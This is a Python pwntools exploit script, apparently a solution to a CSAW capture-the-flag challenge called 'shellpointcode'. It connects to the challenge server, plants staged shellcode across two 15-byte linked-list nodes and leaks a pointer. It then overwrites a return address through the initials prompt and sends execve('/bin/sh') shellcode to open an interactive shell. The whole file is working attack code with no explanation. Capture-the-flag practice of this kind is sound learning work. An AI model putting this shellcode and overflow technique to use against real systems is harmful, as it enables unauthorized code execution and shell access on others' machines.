from pwn import *

#r = process('./shellpointcode')
r = remote('pwn.chal.csaw.io', 9005)
context.arch = 'amd64'
#context.log_level = 'DEBUG'


shellcode = asm('xor rdx, rdx')+asm('add dx, 0x1010')+asm('syscall')
r.sendlineafter('(15 bytes) Text for node 1:  \n', shellcode.ljust(15, 'B'))
print [shellcode.ljust(15, 'B')]
assert '\x00' not in shellcode
assert '\n' not in shellcode
shellcode = 'CCCCC'+asm('xor edi, edi')+asm('xor eax, eax')+asm('add dx, 0x70')+'\xeb\x11'
r.sendlineafter('(15 bytes) Text for node 2: \n', shellcode.ljust(15, 'B'))


r.recvuntil('node.next: ')
shellcode_ptr = int(r.recv(14), 16)
print hex(shellcode_ptr)

#gdb.attach(r, 'b *0x00005555555548ee')
payload = 'A'*11+p64(shellcode_ptr)+asm('add rsi, 0x26b0')+'\xeb\x04'
r.sendlineafter('What are your initials?\n', payload.ljust(0x19, '\x90'))

shellcode = asm("""
	xor rax, rax;
	push rax;
	mov rax, 0x68732f6e69622f;
	push rax;
	mov rdi, rsp;
	xor rdx, rdx;
	xor rsi, rsi;
	mov rax, 0x3b;
	syscall;
""")
time.sleep(1)
r.send('\x90'*0x100+shellcode)

r.interactive()
